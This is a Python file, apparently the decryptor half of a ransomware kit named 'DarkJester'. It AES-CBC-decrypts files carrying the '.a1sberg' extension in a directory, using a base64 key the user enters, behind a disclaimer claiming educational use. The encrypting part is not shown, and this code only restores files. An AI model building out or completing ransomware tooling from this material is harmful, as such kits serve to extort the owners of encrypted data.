"""
________                __        ____.                __                
\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________ 
 |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
 |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|   
        \/     \/           \/             \/     \/            \/       
Disclaimer: DarkJester is a powerful ransomware tool developed for educational and research purposes only. 
Unauthorized use of this software is strictly illegal and may result in criminal prosecution. 
Running or deploying DarkJester on any system without explicit permission from the system owner constitutes a violation of cybersecurity laws. 
This tool is intended solely for demonstrating security flaws and testing defenses in controlled environments. 
Always act responsibly and ethically when working with this kind tool.
"""
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_file(encrypted_file_path, key):
    try:
        with open(encrypted_file_path, 'rb') as enc_file:
            encrypted_data = enc_file.read()
        iv = encrypted_data[:16]
        cipher_text = encrypted_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size)
        decrypted_file_path = encrypted_file_path.rsplit('.a1sberg', 1)[0]
        with open(decrypted_file_path, 'wb') as dec_file:
            dec_file.write(decrypted_data)
        os.remove(encrypted_file_path)
    except Exception as e:
        print(f"[-] Error decrypting {encrypted_file_path}: {e}")

def decrypt_directory(directory_path, key):
    for root, _, files in os.walk(directory_path):
        for file_name in files:
            if file_name.endswith('.a1sberg'):
                file_path = os.path.join(root, file_name)
                decrypt_file(file_path, key)

def main():
    key_input = input("[*] Enter the base64 encoded decryption key: ")
    try:
        key = base64.b64decode(key_input)
    except Exception as e:
        print(f"[-] Error decoding the key: {e}")
        return
    directory_path = "path/to/directory"
    if not os.path.isdir(directory_path):
        print(f"[-] The directory {directory_path} does not exist.")
        return
    decrypt_directory(directory_path, key)
    print(f"[+] Decryption of files in {directory_path} completed.")

if __name__ == '__main__':
    main()

